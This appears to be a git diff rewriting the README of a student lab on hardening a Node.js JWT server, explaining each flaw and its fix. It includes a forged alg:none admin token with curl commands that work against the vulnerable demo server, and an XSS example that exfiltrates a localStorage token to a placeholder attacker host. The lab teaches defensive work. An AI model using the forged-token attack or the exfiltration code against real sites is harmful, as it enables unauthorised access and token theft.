@@ -1,160 +1,553 @@
+# Assignment 2: JWT Hardening Lab (Detailed Walkthrough)
 
-````markdown
+---
 
+> **Persona:** Senior cybersecurity software engineer — this README explains what was changed, why those changes matter, and how to reproduce the assignment evidence (vulnerable demo → hardened server). The goal: harden a Node.js + Express + SQLite JWT lab so it follows secure authentication practices.
+
+---
+
+## Table of contents
+
+* [Introduction](#introduction)
+* [🧐 Vulnerabilities Identified and Addressed](#-vulnerabilities-identified-and-addressed)
+* [🛡️ Security Hardening Steps Implemented in Detail](#-security-hardening-steps-implemented-in-detail)
+* [🚀 How to Run](#-how-to-run)
+* [💥 Demonstrating the 'alg:none' Attack](#-demonstrating-the-algnone-attack)
+* [🕵️‍♂️ Traffic Analysis with Wireshark](#%EF%B8%8F-traffic-analysis-with-wireshark)
+* [Notes, Assumptions & Limitations](#notes-assumptions--limitations)
+* [Appendix: Useful Commands & Snippets](#appendix-useful-commands--snippets)
+
+---
+
+## Introduction
+
+This project is a hands-on lab that demonstrates how to move from an intentionally vulnerable JWT-based Node.js server (`vuln-server.js`) to a hardened implementation (`secure-server.js`). The vulnerable server demonstrates common mistakes (hard-coded secrets, `alg: none` acceptance, long-lived tokens, storing tokens in `localStorage`). The hardened server implements secure patterns:
+
+* Move secrets out of source code into `.env`
+* Short-lived access tokens + refresh token rotation
+* HttpOnly cookie storage for refresh tokens
+* Verifying `iss`, `aud` and enforcing `HS256`
+* Central `authMiddleware` as a single point of verification
+
+This README documents the vulnerabilities, the fixes, how to reproduce attacks against the vulnerable server, and how to show they fail against the hardened server.
+
+---
 
 ## 🧐 Vulnerabilities Identified and Addressed
 
-The original server (`vuln-server.js`) contained several critical weaknesses. Understanding these vulnerabilities is the first step toward securing any system.
+For each vulnerability: **The Problem** and **The Solution**.
 
 ### 1. Hard-coded Secrets
-* **The Problem**: The JWT secret key (`WEAK_SECRET`) was written directly in the source code. If the code were ever leaked (e.g., mistakenly pushed to a public GitHub repository), anyone could see the key and forge any token they want.
-* **The Solution**: Separating configuration and secrets from the code using `.env` files.
+
+**The Problem:**
+`vuln-server.js` uses a hard-coded secret:
+
+```js
+const WEAK_SECRET = 'weak-secret';
+```
+
+Hard-coded secrets in source control are trivially discovered and reused to sign/forge tokens.
+
+**The Solution:**
+Secrets moved to environment variables and loaded with `dotenv`. Example variables:
+
+```
+ACCESS_TOKEN_SECRET
+REFRESH_TOKEN_SECRET
+```
+
+Secrets should be generated with a secure generator (e.g. Node `crypto.randomBytes`, or `openssl rand -hex 32`) and **never** committed.
+
+---
 
 ### 2. `alg:none` Vulnerability
-* **The Problem**: The `/admin` endpoint was designed to blindly trust any token whose header claimed the algorithm was `none`. This allows an attacker to create a token with admin privileges, remove the signature, and send it to the server, which would accept it without any verification.
-* **The Solution**: Enforcing the mandatory use of a strong cryptographic algorithm (`HS256`) when verifying any token.
+
+**The Problem:**
+`vuln-server.js` intentionally decodes and trusts unsigned tokens when the token header sets `"alg": "none"`. This allows attackers to craft a token with `{"alg":"none"}` and arbitrary payload (e.g., `role: "admin"`) to bypass signature verification.
+
+**The Solution:**
+The hardened server enforces allowed algorithms by using `jwt.verify(..., { algorithms: ['HS256'], issuer, audience })` — this rejects unsigned tokens and closes the `alg:none` attack vector.
+
+---
 
 ### 3. Long-Lived Access Tokens
-* **The Problem**: The access token was valid for **7 days**. If an attacker managed to steal this token (e.g., via an XSS attack), they could impersonate the victim for an entire week.
-* **The Solution**: Shortening the access token's lifespan to just **15 minutes**.
 
-### 4. Insecure Token Storage
-* **The Problem**: The original application's design required the front-end to store the token in `localStorage`. Any JavaScript code running on the page (including malicious scripts injected via XSS) can read everything in `localStorage` and easily steal the token.
-* **The Solution**: Implementing the "Refresh Token" pattern and storing its sensitive part in an **`HttpOnly` cookie**.
+**The Problem:**
+The vulnerable implementation issues long-lived access tokens (e.g., `expiresIn: '7d'`). Long-lived access tokens increase the risk window if a token is leaked.
 
-### 5. Missing Claim Validation
-* **The Problem**: The server wasn't validating important claims like `iss` (issuer) and `aud` (audience).
-* **The Solution**: Adding mandatory validation for these claims every time a token is verified.
+**The Solution:**
+Issue short-lived access tokens (recommended: 10–15 minutes). Use refresh tokens to obtain fresh access tokens instead of long-lived access tokens.
+
+---
+
+### 4. Insecure Token Storage (in `localStorage`)
+
+**The Problem:**
+Storing tokens in `localStorage` makes them accessible to JavaScript and therefore to XSS attacks. An attacker who executes JS in the page can read and exfiltrate tokens.
+
+**The Solution:**
+Store refresh tokens in **HttpOnly** cookies (not accessible to JS) and keep access tokens in memory (or in browser-only variables). This prevents theft of the refresh token via XSS. If the UI needs to persist login across refresh, use short-lived access tokens and rely on the HttpOnly refresh cookie for silent reauth.
+
+---
+
+### 5. Missing Claim Validation (`iss`, `aud`)
+
+**The Problem:**
+The vulnerable server did not set or verify `issuer` (`iss`) and `audience` (`aud`) claims. Missing claim checks make it simpler to replay/forge tokens meant for other services.
+
+**The Solution:**
+Include `issuer` and `audience` when issuing tokens and verify them when accepting tokens:
+
+```js
+jwt.sign(payload, ACCESS_SECRET, { issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE, algorithm: 'HS256' })
+jwt.verify(token, ACCESS_SECRET, { algorithms: ['HS256'], issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE })
+```
+
+---
 
 ### 6. No Refresh Token Strategy
-* **The Problem**: Without a mechanism to renew the session, the only option was to use long-lived access tokens, which leads to problem #3.
-* **The Solution**: Building a complete system based on a short-lived access token and a securely stored, long-lived refresh token.
+
+**The Problem:**
+Either no refresh tokens existed, or refresh handling did not implement rotation or server-side checks, which can allow stolen refresh tokens to be reused indefinitely.
+
+**The Solution:**
+Implement Access + Refresh tokens:
+
+* Access token: short-lived, used in `Authorization: Bearer`.
+* Refresh token: long-lived, stored in **HttpOnly cookie**, identified by a `jti`, and tracked server-side in a refresh store (in-memory Map or persisted DB). When a refresh occurs, rotate tokens: invalidate the old `jti` and issue a new refresh token with a new `jti`. This prevents use-after-logout and allows revocation.
 
 ---
 
 ## 🛡️ Security Hardening Steps Implemented in Detail
 
-To fix the above vulnerabilities, we applied the following enhancements to `secure-server.js`.
+Each sub-section explains the fixes and points to the code area (from `secure-server.js`).
 
-### 1. Externalizing Configuration with `.env`
-To solve the **hard-coded secrets** problem, we installed the `dotenv` library and separated all sensitive variables.
-* **Action**: We created a `.env` file to store the actual secrets and a `.env.example` file as a template.
-* **Result**: The code is now clean and secure. The application can be run in different environments with different settings without changing the code.
+### Externalizing Configuration with `.env`
 
-### 2. Implementing the Secure Token Pattern (Access + Refresh Tokens)
+**What we did:**
 
-This is the most significant architectural change, solving the problems of **insecure storage** and **long-lived tokens**.
-* **Access Token**: This is a short-lived "daily pass" (15 minutes). It's sent with every request to access protected resources.
-* **Refresh Token**: This is a long-lived "ID card" (7 days). Its sole purpose is to get a new "daily pass" when the old one expires. The most critical part is that we store it in an **`HttpOnly` cookie**.
-    * **Why `HttpOnly`?**: This flag prevents JavaScript from reading the cookie, providing strong protection against XSS attacks that aim to steal tokens.
+* Added `dotenv` to load environment configuration.
+* Removed hard-coded secrets and constants.
 
-### 3. Building a Central Authentication Middleware
-Instead of repeating verification code in every route, we created an `authMiddleware` function to act as a "gatekeeper" for all protected endpoints.
-* **Strict Verification**: This function uses `jwt.verify` to perform a comprehensive check that includes:
-    1.  **Signature Verification**: Ensures the token has not been tampered with.
-    2.  **Algorithm Verification**: Enforces the use of `HS256` only. This is the **direct solution to the `alg:none` vulnerability**.
-    3.  **Expiration Check**: Ensures the token has not expired.
-    4.  **Claim Validation**: Ensures the `issuer` and `audience` match what is expected.
+**Why:**
 
-### 4. Correcting Authorization Logic in Token Refresh
-* **The Discovered Bug**: The `/refresh` endpoint had a critical logic error; it always issued a new access token with the role hard-coded to `'user'`, even if the user requesting the refresh was an `admin`.
-* **The Fix**: We modified `/refresh` to **query the database for the user's current and correct role** before issuing a new token. This ensures permissions remain accurate at all times.
+* Keeps secrets out of source control.
+* Allows different environments to use different credentials/config without code changes.
+
+**Example `.env.example`:**
+
+```
+PORT=1235
+ACCESS_TOKEN_SECRET=
+REFRESH_TOKEN_SECRET=
+TOKEN_ISSUER=jwt-lab-app
+TOKEN_AUDIENCE=api.jwt-lab
+ACCESS_TOKEN_EXPIRES=15m
+REFRESH_TOKEN_EXPIRES=7d
+```
+
+**How to generate secrets:**
+
+* Node: `node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"`
+* OpenSSL: `openssl rand -hex 32`
+
+*Store the generated hex strings in `.env` as `ACCESS_TOKEN_SECRET` and `REFRESH_TOKEN_SECRET`.*
+
+---
+
+### Implementing the Secure Token Pattern (Access + Refresh Tokens)
+
+**Design:**
+
+* **Access Token**: short-lived (e.g., `15m`), used for API calls, returned in JSON to the client, *not* persisted to `localStorage` (prefer memory).
+* **Refresh Token**: long-lived (e.g., `7d`), stored in an **HttpOnly**, `SameSite` cookie — not accessible by JS. Server keeps a mapping of `jti` → owner and invalidates used `jti`s (rotation).
+
+**Why HttpOnly cookie for refresh token matters:**
+HttpOnly prevents JavaScript from reading the cookie value; thus even a successful XSS cannot directly steal the refresh token. This drastically reduces token theft risk.
+
+**Example issuance (conceptual):**
+
+```js
+// access token (signed with ACCESS_SECRET)
+const accessToken = jwt.sign(
+  { sub: user.username, role: user.role },
+  ACCESS_SECRET,
+  { algorithm: 'HS256', expiresIn: '15m', issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE }
+);
+
+// refresh token (signed with REFRESH_SECRET, includes jti)
+const refreshTokenId = crypto.randomBytes(16).toString('hex');
+const refreshToken = jwt.sign(
+  { sub: user.username, jti: refreshTokenId },
+  REFRESH_SECRET,
+  { algorithm: 'HS256', expiresIn: '7d', issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE }
+);
+refreshStore.set(refreshTokenId, { username: user.username });
+res.cookie('refreshToken', refreshToken, { httpOnly: true, sameSite: 'Strict', secure: false, maxAge: 7*24*60*60*1000 });
+res.json({ accessToken });
+```
+
+> **Note:** `secure: true` should be used in production when running over HTTPS. For local lab demos without HTTPS `secure` can be `false`.
+
+---
+
+### Building a Central Authentication Middleware
+
+**What:** `authMiddleware` centralizes verification:
+
+* Ensures `Authorization` header exists and follows `Bearer <token>`
+* Verifies with `jwt.verify(token, ACCESS_SECRET, { algorithms: ['HS256'], issuer, audience })`
+* Attaches `req.user = payload` for downstream handlers
+
+**Why:**
+
+* Single place to enforce claims, algorithms, expiration — reduces risk of inconsistent checks across endpoints.
+* Explicitly enforces `HS256` (so `alg:none` and other algorithms are rejected).
+
+**Example `authMiddleware` snippet:**
+
+```js
+function authMiddleware(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'No token provided' });
+  }
+  const token = authHeader.split(' ')[1];
+
+  try {
+    const payload = jwt.verify(token, ACCESS_SECRET, {
+      algorithms: ['HS256'],
+      issuer: TOKEN_ISSUER,
+      audience: TOKEN_AUDIENCE
+    });
+    req.user = payload;
+    next();
+  } catch (err) {
+    return res.status(401).json({ error: `Invalid or expired token: ${err.message}` });
+  }
+}
+```
+
+This middleware *prevents* unsigned tokens and tokens with missing/mismatched `iss`/`aud`.
+
+---
+
+### Correcting Authorization Logic in Token Refresh
+
+**The subtle bug we fixed:**
+A naive `/refresh` implementation issued a new access token using a hard-coded role (e.g., always `"user"`) — even if the original user was `admin`. This allows privilege downgrades or, if reversed, potential escalation.
+
+**Fix implemented:**
+
+* After validating the refresh token's `jti` and `sub`, the server queries the DB to get the current `role` for `sub` (username).
+* The server then issues a new access token that includes the *actual role from the DB*.
+* Also implement refresh token **rotation**: delete the old `jti` entry from `refreshStore` after use, and store the new `jti`.
+
+**Why:**
+
+* Ensures that the newly minted access token reflects the authoritative role stored in the database (prevents accidental/intentional privilege changes via refresh token misuse).
+* Rotation prevents reuse of a stolen refresh token.
 
 ---
 
 ## 🚀 How to Run
 
+These commands assume the project root contains the files: `vuln-server.js`, `secure-server.js`, `package.json`, `init-db.js`, and `users.db` (or `npm run init-db` will create it).
+
+> **Important:** Do **not** commit a `.env` file with real secrets. Commit `.env.example` only.
+
 ### 1. Prerequisites
-* Node.js (v18+)
+
+* Node.js v18+ (recommended)
 * npm
+* (Optional) sqlite3 client if you want to inspect the DB manually
 
 ### 2. Installation
+
 ```bash
-# Clone the repository
-git clone <your-repo-url>
-cd <repo-folder>
-
-# Install dependencies
+git clone <repo-url>
+cd <repo-directory>
 npm install
-````
+```
 
-### 3\. Configuration
+### 3. Configuration
 
-Copy the example environment file and fill it with your own secret values. **Use a secure random string generator for the secrets.**
+Create a `.env` file from `.env.example`:
 
 ```bash
 cp .env.example .env
+# then edit .env and set values
+# Generate secrets with:
+node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
+# paste outputs into ACCESS_TOKEN_SECRET and REFRESH_TOKEN_SECRET
 ```
 
-Now, open the `.env` file and add the secrets you generated.
+Example `.env` (DO NOT COMMIT real secrets):
 
-### 4\. Initialize the Database
+```
+PORT=1235
+ACCESS_TOKEN_SECRET=<paste generated hex>
+REFRESH_TOKEN_SECRET=<paste generated hex>
+TOKEN_ISSUER=jwt-lab-app
+TOKEN_AUDIENCE=api.jwt-lab
+ACCESS_TOKEN_EXPIRES=15m
+REFRESH_TOKEN_EXPIRES=7d
+```
 
-This command creates the `users.db` file and populates it with sample users (`admin`/`adminpass` and `alice`/`alicepass`).
+### 4. Initialize the Database
+
+If a DB initializer is provided:
 
 ```bash
 npm run init-db
+# or
+node init-db.js
 ```
 
-### 5\. Run the Servers
+This creates `users.db` and example users with hashed passwords.
 
-You can run both servers simultaneously on different ports.
+### 5. Run the Servers
+
+We recommend adding scripts to `package.json` like:
+
+```json
+"scripts": {
+  "start-vuln": "node vuln-server.js",
+  "start-secure": "node secure-server.js",
+  "init-db": "node init-db.js"
+}
+```
+
+Run the vulnerable server:
 
 ```bash
-# Start the vulnerable server on http://localhost:1234
 npm run start-vuln
+# Vuln server default: http://localhost:1234
+```
 
-# Start the secure server on http://localhost:1235
+Run the hardened secure server (use a different port, e.g. 1235):
+
+```bash
 npm run start-secure
+# Secure server default: http://localhost:1235
 ```
 
------
+---
 
-## 💥 Demonstrating the `alg:none` Attack
+## 💥 Demonstrating the 'alg:none' Attack
 
-### 1\. Attacking the Vulnerable Server (Successful ✅)
+Below are concrete reproduction steps used in the lab.
 
-Use `curl` or Postman to send a forged, unsigned token. The token consists of only two parts (header and payload) separated by a dot.
+### 1. Attacking the Vulnerable Server (Successful ✅)
 
-  * **Header**: `{"alg":"none","typ":"JWT"}`
-  * **Payload**: `{"sub":"hacker","role":"admin"}`
+**Why this works on `vuln-server.js`:**
+`vuln-server.js` reads the token header and intentionally accepts tokens where `header.alg === 'none'`. It decodes the payload and trusts it without verifying a signature.
 
-<!-- end list -->
+**Craft unsigned token (for demo)**
+
+* Header: `{"alg":"none"}`
+* Payload: `{"sub":"admin","role":"admin"}`
+* Token (base64url header + "." + base64url payload + "."):
+
+```
+eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiJ9.
+```
+
+**curl to call the vulnerable `/admin` (port 1234):**
 
 ```bash
-curl -X GET http://localhost:1234/admin \
-  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJoYWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ."
+curl -i -H "Authorization: Bearer eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiJ9." http://localhost:1234/admin
 ```
 
-**Expected Result**: You will successfully retrieve the sensitive data because the vulnerable server has an `if` condition that allows this type of token to pass.
+**Expected result (vulnerable server):**
 
-### 2\. Attacking the Hardened Server (Fails ❌)
+* Returns `200` with `VERY SENSITIVE ADMIN DATA (ACCESSED VIA alg:none DEMO)` because the server decodes and trusts the payload.
 
-Execute the **exact same command** but target the secure server on port `1235`.
+---
+
+### 2. Attacking the Hardened Server (Fails ❌)
+
+**Same curl, different port (secure server at 1235):**
 
 ```bash
-curl -X GET http://localhost:1235/admin \
-  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJoYWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ."
+curl -i -H "Authorization: Bearer eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiJ9." http://localhost:1235/admin
 ```
 
-**Expected Result**: The request will be rejected with a **`401 Unauthorized`** error. This is because our `authMiddleware` enforces verification using only the `HS256` algorithm, and anything else (including `none`) will fail immediately.
+**Why it fails on `secure-server.js`:**
 
------
+* `authMiddleware` calls `jwt.verify()` with `algorithms: ['HS256']` and checks `issuer` and `audience`. The token with `alg:none` is unsigned and fails verification. The server returns `401 Invalid or expired token` (or similar), preventing access.
+
+---
 
 ## 🕵️‍♂️ Traffic Analysis with Wireshark
 
-This section explains how to see the token being sent over the network, highlighting the importance of using HTTPS.
+Follow these steps to capture network traffic and inspect tokens for the assignment evidence:
 
-1.  **Start Capture**: Open Wireshark and begin capturing on your local loopback interface.
-2.  **Filter Traffic**: To easily find the requests, use a display filter like `http.request.method == "POST" && tcp.port == 1235`.
-3.  **Perform Login**: Use the front-end UI to log in to the secure server (`localhost:1235`).
-4.  **Inspect the Packet**:
-      * Find the `POST /login` packet in the Wireshark list.
-      * In the "Packet Details" pane below, expand the "Hypertext Transfer Protocol" section.
-      * You will see the `Authorization: Bearer <JWT_TOKEN...>` header in plain, readable text.
-      * **Conclusion**: This proves that anyone on the same network (e.g., at a coffee shop) can see the token if the connection is not encrypted. This is why **using HTTPS is mandatory and non-negotiable** in any real-world application.
+### Capture steps (example for local testing)
 
-<!-- end list -->
+1. **Open Wireshark** (run as admin if needed).
+2. **Select the interface**:
 
+   * On Linux: `lo` (loopback).
+   * On macOS: `lo0` or `Loopback`.
+   * On Windows (Npcap installed): `Npcap Loopback Adapter`.
+3. **Start capture** on the chosen interface before issuing requests.
+
+### Filter the traffic
+
+* To see HTTP traffic on the vulnerable server port (1234):
+
+  ```
+  http && tcp.port == 1234
+  ```
+* Generic filter for port:
+
+  ```
+  tcp.port == 1234 || tcp.port == 1235
+  ```
+* To find the `Authorization` header in HTTP:
+
+  * Stop the capture then right-click a packet → Follow → HTTP Stream
+  * Or use `http` display filter then inspect packet details → `Hypertext Transfer Protocol` → `Authorization`
+
+### What you will observe (HTTP)
+
+* **Authorization header is visible in plain text** inside HTTP requests (e.g., `Authorization: Bearer <token>`).
+* The payloads (JWTs) are readable — both header and payload base64 parts are visible.
+
+### Why HTTPS is mandatory
+
+* Over HTTP, anybody on the network (or on the same machine if capture accessible) can view tokens in plain text.
+* With HTTPS (TLS), the Authorization header and token are inside an encrypted TCP stream; Wireshark will show TLS handshake messages and encrypted application data — token contents will not be visible.
+* **Conclusion:** Always use HTTPS in production. For a local bonus, you can run the secure server with a self-signed certificate and demonstrate that Wireshark can no longer view the token payload in cleartext.
+
+---
+
+## Notes, Assumptions & Limitations
+
+* `.env.example` is included. **Do not** commit `.env` with real secrets.
+* For local demos without HTTPS, `secure` flag in cookies is set to `false`. In production over HTTPS, set `secure: true`.
+* The refresh-store used in the lab is an in-memory Map (`refreshStore`) for rotation demo. For persistence across restarts, implement a DB-backed store (bonus requirement).
+* Rate limiting and helmet (secure headers) are recommended for production (bonus tasks).
+* The lab keeps the supplied frontend; only minor client edits may be necessary (e.g., `fetch(..., { credentials: 'include' })` for cookie refresh flow).
+
+---
+
+## Appendix: Useful Commands & Snippets
+
+### Generate secure secrets
+
+```bash
+# Node
+node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
+
+# OpenSSL
+openssl rand -hex 32
 ```
+
+### Example curl to login (adjust according to your endpoints)
+
+```bash
+curl -i -X POST http://localhost:1235/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"password123"}'
 ```
+
+### Example code snippets used in `secure-server.js`
+
+**authMiddleware**
+
+```js
+const jwt = require('jsonwebtoken');
+
+function authMiddleware(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'No token provided' });
+  }
+  const token = authHeader.split(' ')[1];
+
+  try {
+    const payload = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, {
+      algorithms: ['HS256'],
+      issuer: process.env.TOKEN_ISSUER,
+      audience: process.env.TOKEN_AUDIENCE
+    });
+    req.user = payload;
+    next();
+  } catch (err) {
+    return res.status(401).json({ error: `Invalid or expired token: ${err.message}` });
+  }
+}
+```
+
+**Refresh rotation sketch**
+
+```js
+// refreshStore is a Map of jti -> { username, createdAt }
+const refreshStore = new Map();
+
+app.post('/refresh', (req, res) => {
+  const token = req.cookies.refreshToken;
+  if (!token) return res.status(401).json({ error: 'No refresh token' });
+
+  let payload;
+  try {
+    payload = jwt.verify(token, process.env.REFRESH_TOKEN_SECRET, {
+      algorithms: ['HS256'],
+      issuer: process.env.TOKEN_ISSUER,
+      audience: process.env.TOKEN_AUDIENCE
+    });
+  } catch (err) {
+    return res.status(401).json({ error: 'Invalid refresh token' });
+  }
+
+  // Check jti in refreshStore
+  if (!refreshStore.has(payload.jti)) {
+    return res.status(401).json({ error: 'Refresh token not recognized' });
+  }
+
+  // Fetch authoritative role from DB
+  DB.get("SELECT role FROM users WHERE username = ?", [payload.sub], (err, row) => {
+    if (err || !row) return res.status(401).json({ error: 'User not found' });
+
+    // Rotate: delete old jti, create new one
+    refreshStore.delete(payload.jti);
+    const newJti = crypto.randomBytes(16).toString('hex');
+    const newRefreshToken = jwt.sign({ sub: payload.sub, jti: newJti }, process.env.REFRESH_TOKEN_SECRET, {
+      algorithm: 'HS256',
+      expiresIn: process.env.REFRESH_TOKEN_EXPIRES,
+      issuer: process.env.TOKEN_ISSUER,
+      audience: process.env.TOKEN_AUDIENCE
+    });
+    refreshStore.set(newJti, { username: payload.sub });
+
+    const newAccessToken = jwt.sign({ sub: payload.sub, role: row.role }, process.env.ACCESS_TOKEN_SECRET, {
+      algorithm: 'HS256',
+      expiresIn: process.env.ACCESS_TOKEN_EXPIRES,
+      issuer: process.env.TOKEN_ISSUER,
+      audience: process.env.TOKEN_AUDIENCE
+    });
+
+    res.cookie('refreshToken', newRefreshToken, { httpOnly: true, sameSite: 'Strict', secure: false, maxAge: 7*24*60*60*1000 });
+    res.json({ accessToken: newAccessToken });
+  });
+});
+```
+
+### Example: Showing how `localStorage` token theft happens (don’t run on production)
+
+In a vulnerable app that stores a token in `localStorage`, an XSS payload could read:
+
+```js
+// attacker JS injected via XSS
+fetch('https://attacker.example/exfil', {
+  method: 'POST',
+  body: localStorage.getItem('token')
+});
+```
+
+This demonstrates why `localStorage` is unsafe for long-lived secrets. Use HttpOnly cookies for refresh tokens and keep access tokens short-lived and preferably in memory.
+
+---
+
